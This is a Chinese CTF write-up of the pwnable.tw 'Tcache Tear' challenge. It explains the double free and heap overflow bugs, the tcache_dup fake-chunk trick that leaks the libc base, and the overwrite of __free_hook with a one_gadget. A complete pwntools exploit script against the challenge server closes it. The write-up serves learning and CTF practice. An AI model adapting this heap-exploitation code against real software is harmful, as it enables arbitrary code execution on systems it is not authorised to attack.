---
title: Tcache Tear
categories:
- pwnable.tw
---
# pwnable.tw->Tcache Tear

## 前言

花了两天，libc的泄露一直没想到思路，遂看了别人的writeup。终于在中午两点的时候成功了，纪念差点儿低血糖晕倒的清明假期。

## 程序逻辑

函数主要有三个功能，Malloc、Free和Info。Malloc里可以malloc一个大小小于0xff的堆块，注意这里的get_input函数获取的输入大小为size-16,如果size为小于16的正数，得到的结果被转换为无符号整数参数就会产生堆溢出。此外这里存储malloc_chunk的地方只有一个，每当Malloc被调用，0x602088就会写入malloc_chunk_addr。
get_input函数没有什么特别的，这里注意一下使用的是__read_chk进行读取，这个函数跟read不一样的地方在于其参数有一个buf，用来标识缓存区大小，避免溢出。
free部分一是没有检验ptr是不是为释放过的指针，造成double free，二是没有将ptr的内容置为空，存在被泄露的风险。此外这里限制了free的次数，最多可以free 8次，目前看来也没什么好的办法把这个栈上的free_num修改掉


![main](./1.jpg)

![Malloc](./2.jpg)

![get_input](./3.jpg)

## 漏洞利用

这里最重要的两个漏洞就是double free和堆溢出。如果是Glibc-2.23可以构造unlink或者double free。根据Libc.so的版本2.27(给执行权限直接执行即可看到版本)以及题目名，可以想到这里主要考察的是tcache漏洞的利用。关于tcache，p4nda师傅有一篇非常详尽的分析
[p4nda](http://p4nda.top/2018/03/20/tcache/)
其利用方法也比较多，这里由于有double free，我们可以通过tcache_dup去做，fastbin的检查机制是刚释放的堆块和之前的不同
而tcache没有类似的检查，直接释放即可。下面是具体的漏洞利用

### 泄露Libc地址

Malloc(0x60)一个堆块，Free()之后它被放入tcache_entry里，此时继续Free()，tcache_entry[i]有两个成员，均为第一个chunk的地址，此时Malloc(0x60,p64(addr))会将tcache_entry[i]的chunk分配出来，且fd指向的addr也进入了这个tcache_entry[i]，调用一次Malloc(0x60)得到第一个堆块，再调用一次Malloc(0x60)即可分配得到目标地址所在的堆块(注意在entry中存储的地址是chunk_addr+0x10，因此addr填的应当是希望分配到的chunk的地址+0x10)  
根据上述原理，我们基本思路是在Name所在的0x20区域内构造一个unsortebin(其size>0x408)，Free(unsoretd_bin)会使得其fd和bk通过Info泄露出来，fd = main_arena_add + 96，即可反推出libc_base。这里我们先Malloc(0x60)到name附近的一个fake_chunk，这个fake_chunk的地址是0x60203d(通过pwndbg的find_fake_fast)找到，之后在其中构造另一个fake chunk，其结构如下：  
0x602050:prev_size,chunk_size(0x421)  
0x602060:paddings  
0x602070:paddings  
0x602080:paddings，p64(0x602050)    
如此，Free()的时候即可往0x602060处写入main_arena+96。但是注意这里__libc_free的时候对于chunk有检查，很重要的一点是这个chunk的next_chunk的prev_in_use位要置为1，因此在构造这个chunk之前，我们要先在0x602050+0x420处构造另一个fake_next_chunk以逃避检查(bss段页对齐因此肯定不会越界),这个chunk的结构如下：   
0x602470:0,size(0x21)  
0x602480:padding  
0x602090:0x20,0x21  
注意后面Next_chunk的后面也不能省略，因为free的时候会看这个chunk来确定next_chunk能不能unlink。  
按照上述操作先后malloc(next_fake_chunk)和malloc(fake_unsorted_chunk)再Info()可以获得Libc_base

### get shell

依然是相似的方法，用One_gadgets覆盖掉__free_hook或者__malloc_hook，这里我开始用__malloc_hook发现one_gadgets的三个gadget条件均不满足，换成__free_hook即可成功拿到shell

### 待解疑惑

第一次double free后通过Malloc(0x60)成功写入next_chunk，之后准备第二次double free的时候如果还是Malloc(0x60)再Free()，会发现此时的chunk没有进入tcache_entry，而是进了fastbin，这直接导致double free失败，若是Malloc(other_size_but_0x60)即可重新进tcache_entry，看了会代码也没想明白，打算明天问下p4nda学长

### 后记

调试了很久终于破案了。是这样的，malloc的时候会先执行tcache_get()函数，这函数是这样的。借用ctf-wiki的图，在堆初始化的时候会分配一块内存用来存储这样一个数据结构，本地调试的地址为0x603000，那么0x603010+0x5代表的就是counts[5]即0x60大小的堆块在tcache中的个数。问题就出在这个地方，在double free又malloc的时候，counts[5]已经被置为0，而malloc的时候并不会检查这个地方是不是0，直接-1变成了0xff，而tcache_put()之前会比较counts[5]和0x7，由于都是无符号整数，这个if进不去导致堆管理认为tcache已经满了，因此把它放进了fastbin，造成了后来double free的失败  
ps:我调试的时候是比对着正常malloc、free过程看的汇编，p4nda师傅给了一个directory命令用来添加libc用来看C，感觉解锁了新世界大门2333

![tcache_prethread_struct](./4.jpg)

```C
/* Caller must ensure that we know tc_idx is valid and there's
   available chunks to remove.  */
static __always_inline void *
tcache_get (size_t tc_idx)
{
  tcache_entry *e = tcache->entries[tc_idx];
  assert (tc_idx < TCACHE_MAX_BINS);
  assert (tcache->entries[tc_idx] > 0);
  tcache->entries[tc_idx] = e->next;
  --(tcache->counts[tc_idx]); // 获得一个 chunk，counts 减一
  return (void *) e;
}

static void
_int_free (mstate av, mchunkptr p, int have_lock)
{
  ......
  ......
#if USE_TCACHE
  {
    size_t tc_idx = csize2tidx (size);
    if (tcache
        && tc_idx < mp_.tcache_bins // 64
        && tcache->counts[tc_idx] < mp_.tcache_count) // 7
      {
        tcache_put (p, tc_idx);
        return;
      }
  }
#endif

/* Caller must ensure that we know tc_idx is valid and there's room
   for more chunks.  */
static __always_inline void
tcache_put (mchunkptr chunk, size_t tc_idx)
{
  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);
  assert (tc_idx < TCACHE_MAX_BINS);
  e->next = tcache->entries[tc_idx];
  tcache->entries[tc_idx] = e;
  ++(tcache->counts[tc_idx]);
}

```


## exp.py

```py
#coding=utf-8
from pwn import *
context.update(arch='amd64',os='linux',log_level="debug")
context.terminal = ['tmux','split','-h']
debug = 0
elf = ELF('./tcache_tear')
if debug:
    p = process('./tcache_tear')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    offset = 0x3ebc40
    gadgets = [0x4f2c5,0x4f322,0x10a38c]
    gdb.attach(p)
else:
    libc = ELF('./libc.so')
    p = remote('chall.pwnable.tw',10207)
    offset = 0x3ebc40
    gadgets = [0x4f2c5,0x4f322,0x10a38c]

def Malloc(size,content):
    p.recvuntil('Your choice :')
    p.sendline('1')
    p.recvuntil('Size:')
    p.sendline(str(size))
    p.recvuntil('Data:')
    p.send(content)

def Free():
    p.recvuntil('Your choice :')
    p.sendline('2')

def Info():
    p.recvuntil('Your choice :')
    p.sendline('3')

def Exit():
    p.recvuntil('Your choice :')
    p.sendline('4')

def exp():
    p.recvuntil('Name:')
    p.sendline('wz')
    Malloc(0x60,'a'*8)#idx0
    Free()
    Free()
    #Malloc(0x60,p64(0x60203d))#idx0
    Malloc(0x60,p64(0x602470))#idx0
    Malloc(0x60,'c'*8)#idx0
    ## write the next chunk of unsorted bin chunk
    Malloc(0x60,p64(0x0)+p64(0x21)+'a'*0x10+p64(0x20)+p64(0x21))
    #preapare for another double free
    Malloc(0x70,'a'*8)
    Free()
    Free()
    Malloc(0x70,p64(0x60203d))#a fake chunk ahead of 0x602060(name)
    Malloc(0x70,'a'*8)
    #Malloc(0x60,'a'*19+p64(0xfff7dcfa00000000)+p64(0x21)+'a'*0x10+p64(0x20)+p64(0x21)+'a'*8+p64(0x602060))#0x60203d
    Malloc(0x70,'a'*19+p64(0xfff7dcfa00000000)+p64(0x421)+'a'*0x28+p64(0x602060))#fake chunk
    Free()#unsorted bin leak
    Info()
    p.recvuntil('Name :')
    main_arena = u64(p.recv(8))-96
    libc_base = main_arena - offset
    log.success('libc base => ' + hex(libc_base))
    #get shell
    free_hook = libc_base + libc.symbols['__free_hook']
    log.success('free hook addr => ' + hex(free_hook))
    shell_addr = libc_base + gadgets[1]
    Malloc(0x80,'1'*8)
    Free()
    Free()
    Malloc(0x80,p64(free_hook-0x10))
    Malloc(0x80,'a'*8)
    log.success('before hack')
    Malloc(0x80,'a'*0x10+p64(shell_addr))
    Free()
    p.interactive()
    
exp()

```
